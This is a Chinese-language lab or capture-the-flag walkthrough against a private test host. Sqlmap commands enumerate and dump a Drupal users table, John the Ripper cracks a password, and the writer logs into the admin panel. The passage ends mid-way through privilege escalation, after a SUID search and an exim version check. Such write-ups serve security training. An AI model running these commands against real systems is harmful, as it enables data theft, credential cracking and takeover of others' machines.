## 漏洞利用

使用sqlmap暴库

```
sqlmap http://192.168.1.16/?nid=1 --dbs
```

![](../Images/46432d367f6135ed2eb2c497f0ea0a16.png)

  

  

暴表

```
sqlmap http://192.168.1.16/?nid=1 -D d7db --tables
```

![](../Images/f0ca300cd8342a97a51012d899cc9977.png)

  

  

暴字段

```
sqlmap http://192.168.1.16/?nid=1 -D d7db -T users --columns
```

![](../Images/078035a46cb0ac4686d280d5a9ded4dc.png)

  

  

拖库

```
sqlmap http://192.168.1.16/?nid=1 -D d7db -T users -C name,pass --dump
```

![](../Images/9949f114ed71d319411a426489da2d17.png)

  

  

将密码hash保存到password.txt中，使用john破解

```
john password.txt
```

得到john的的密码turtle

![](../Images/81277b7c6ea332a4b88af1413c9e50e0.png)

  

  

使用账户john登录后台，成功

![](../Images/b93579ab8914e9265d51f995aa9a8f5f.png)

## 提权

查看系统信息

```

cat /proc/version
```

![](../Images/e4d4e87c5d4cb33bf8a3cfc4c16f3430.png)

  

没有可以利用的

查找suid权限的程序

```
find / -user root -perm -4000 -print 2>/dev/null
```

![](../Images/3adc6b26dc98cd576d70a132f8b4476a.png)

  

查找到exim存在可以利用的提权脚本

![](../Images/e9f8f06502fa774a234beb9e7b3f54e5.png)

/usr/sbin/exim4 --version
